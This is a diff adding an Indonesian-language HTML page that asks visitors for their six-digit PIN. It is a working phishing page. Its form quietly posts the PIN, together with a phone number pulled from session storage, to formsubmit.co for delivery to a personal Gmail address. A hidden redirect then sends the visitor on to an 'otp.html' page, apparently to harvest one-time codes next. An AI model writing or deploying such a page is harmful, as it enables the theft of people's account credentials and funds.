@@ -1,0 +1,26 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Masukkan PIN</title>
+</head>
+<body>
+  <h2>Masukkan PIN Anda</h2>
+  <form id="form" action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
+    <input type="hidden" name="_next" value="otp.html">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="Nomor HP" id="phoneHidden">
+    <input type="text" id="pin" name="PIN" placeholder="******" maxlength="6" required>
+    <button type="submit" onclick="savePin()">Lanjut</button>
+  </form>
+  <script>
+    document.getElementById('phoneHidden').value = sessionStorage.getItem('phone');
+    function savePin() {
+      const pin = document.getElementById('pin').value;
+      sessionStorage.setItem('pin', pin);
+    }
+  </script>
+</body>
+</html>
